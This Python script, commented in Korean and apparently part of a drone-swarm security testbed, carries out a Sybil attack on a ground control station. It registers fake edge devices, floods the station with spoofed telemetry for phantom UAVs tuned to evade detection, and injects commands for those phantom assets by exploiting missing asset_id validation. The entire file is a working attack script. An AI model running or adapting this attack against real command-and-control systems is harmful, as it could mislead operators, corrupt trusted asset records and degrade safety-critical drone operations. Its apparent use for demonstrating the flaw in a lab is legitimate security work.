"""
Sybil Phantom Fleet 공격
독창 시나리오 | IEEE IoT-J 2023 "Sybil Attacks on UAV Swarm C2" 계열

GCS telemetry/ingest 엔드포인트가 asset_id 존재 여부를 검증하지 않음
(state.py ingest_telemetry 참조 — _known_asset_ids()로 사후 추가만 됨)을 악용.

존재하지 않는 유령 자산(Phantom Assets)을 대량 등록해
  1. /api/tracks 응답에 유령 항적이 등장 → 운용자 혼란
  2. _known_asset_ids() 집합이 오염 → 공격자가 유령 자산에 커맨드를 주입 가능
  3. external_frames dict 과부하 → GCS 메모리/응답 지연
"""
from __future__ import annotations

import argparse
import math
import random
import string
import time
from .common import GcsClient, wait_for_gcs

# 실제 존재하는 자산처럼 보이는 유령 자산 이름 패턴
PHANTOM_PREFIXES = [
    "shadow-uav", "ghost-dronebot", "phantom-ugv",
    "sybil-scout", "decoy-platform", "clone-asset",
]


def _random_suffix(length: int = 4) -> str:
    return "".join(random.choices(string.digits, k=length))


def _phantom_position(index: int, elapsed: float) -> list[float]:
    """유령 자산 위치: 실제 작전 구역 안에서 그럴듯하게 이동"""
    angle = (index * 137.5 + elapsed * 12) % 360  # 황금각 분산
    radius = 150 + (index % 5) * 60
    x = radius * math.cos(math.radians(angle)) + random.gauss(0, 2)
    y = radius * math.sin(math.radians(angle)) + random.gauss(0, 2)
    z = 80 + (index % 3) * 30 + random.gauss(0, 1)
    return [round(x, 2), round(y, 2), round(z, 2)]


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Sybil Phantom Fleet 공격")
    parser.add_argument("--service-url",   default="http://dah-gcs:8080")
    parser.add_argument("--fleet-size",    type=int, default=12,
                        help="생성할 유령 자산 수")
    parser.add_argument("--interval-s",    type=float, default=1.0)
    parser.add_argument("--duration-s",    type=float, default=120.0)
    parser.add_argument("--also-inject-commands", action="store_true", default=True,
                        help="유령 자산에 커맨드 주입 (GCS가 차단 못함을 증명)")
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    # 유령 자산 ID 생성
    phantom_assets = [
        f"{random.choice(PHANTOM_PREFIXES)}-{_random_suffix()}"
        for _ in range(args.fleet_size)
    ]

    # 각 유령 자산에 위장 엣지 등록
    phantom_edges = []
    for i, asset_id in enumerate(phantom_assets):
        edge_id = f"edge-sybil-{i:02d}"
        try:
            client.post("/api/edge/devices/register", {
                "edge_id":         edge_id,
                "device_type":     "uav_edge" if "ugv" not in asset_id else "ugv_edge",
                "asset_ids":       [asset_id],
                "authority":       "EXTERNAL-ATTACKER",
                "link_profiles":   ["rf_spoofed"],
                "capabilities":    ["telemetry_ingest"],
                "software_version": "sybil-0.1",
            })
            phantom_edges.append((asset_id, edge_id))
            print(f"[sybil] 유령 엣지 등록: {edge_id} → {asset_id}", flush=True)
        except Exception as e:
            print(f"[sybil] 등록 건너뜀 {edge_id}: {e}", flush=True)
            phantom_edges.append((asset_id, edge_id))  # 등록 실패해도 텔레메트리 주입 시도

    print(f"[sybil] 유령 함대 {len(phantom_edges)}개 구성 완료. 텔레메트리 주입 시작", flush=True)

    start = time.time()
    tick = 0
    injected_total = 0

    while (time.time() - start) < args.duration_s:
        elapsed = time.time() - start
        batch_ok = 0

        for i, (asset_id, edge_id) in enumerate(phantom_edges):
            pos = _phantom_position(i, elapsed)
            try:
                client.post("/api/telemetry/ingest", {
                    "asset_id":         asset_id,
                    "time_s":           tick,
                    "position":         pos,
                    "velocity_mps":     [random.gauss(12, 2), random.gauss(0, 1), 0],
                    "heading_deg":      (i * 30 + tick * 5) % 360,
                    "status":           "edge-live",
                    "mission_id":       f"phantom-mission-{i % 3}",
                    "source":           "SYBIL-FLEET",
                    "source_id":        edge_id,
                    "source_type":      "uav_edge",
                    "source_authority": "EXTERNAL-ATTACKER",
                    "track_confidence": 0.70 + random.gauss(0, 0.05),  # 탐지 회피 범위
                    "link_profile":     "rf_spoofed",
                    "battery_wh":       random.uniform(200, 680),
                })
                batch_ok += 1
                injected_total += 1
            except Exception as e:
                print(f"[sybil] 텔레메트리 오류 {asset_id}: {e}", flush=True)

        # 커맨드 주입: 유령 자산이 _known_asset_ids()에 추가됐으므로 command.requested 가능
        if args.also_inject_commands and tick % 10 == 0 and phantom_assets:
            target = random.choice(phantom_assets)
            try:
                result = client.post("/api/commands/request", {
                    "asset_id":     target,
                    "command_type": "hold_position",
                    "requested_by": "ATTACKER:sybil_phantom_command",
                    "dry_run":      True,
                })
                cmd_id = result.get("payload", {}).get("command_id")
                print(f"[sybil] 유령 자산 커맨드 주입 성공: {target} cmd={cmd_id}", flush=True)
            except Exception as e:
                print(f"[sybil] 커맨드 주입 실패 (자산 인식 전): {e}", flush=True)

        print(
            f"[sybil] tick={tick:04d} | 배치 성공={batch_ok}/{len(phantom_edges)} "
            f"| 누적 주입={injected_total} | 경과={elapsed:.0f}s",
            flush=True,
        )
        tick += 1
        time.sleep(args.interval_s)

    print(
        f"[sybil] 공격 종료 — 유령 자산 {len(phantom_assets)}개, "
        f"총 텔레메트리 {injected_total}건 주입",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
